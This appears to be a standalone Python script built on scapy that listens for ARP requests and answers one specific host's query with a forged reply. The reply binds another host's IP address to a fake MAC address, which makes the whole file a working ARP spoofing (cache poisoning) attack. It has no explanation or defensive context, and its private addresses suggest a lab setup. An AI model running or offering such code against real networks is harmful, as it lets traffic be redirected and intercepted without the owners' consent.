#! /usr/bin/env python
from scapy.all import *

def arp_monitor_callback(pkt):
    if ARP in pkt and pkt[ARP].op in (1,2): #who-has or is-at
        #print pkt.show()
	if pkt[ARP].psrc == "192.168.56.22" and pkt[ARP].op == 1 and pkt[ARP].pdst == "192.168.56.88":
		response = ARP(psrc="192.168.56.88", pdst="192.168.56.22", op="is-at", hwsrc="22:22:22:22:22:22")
		send(response)

sniff(prn=arp_monitor_callback, filter="arp", store=0)
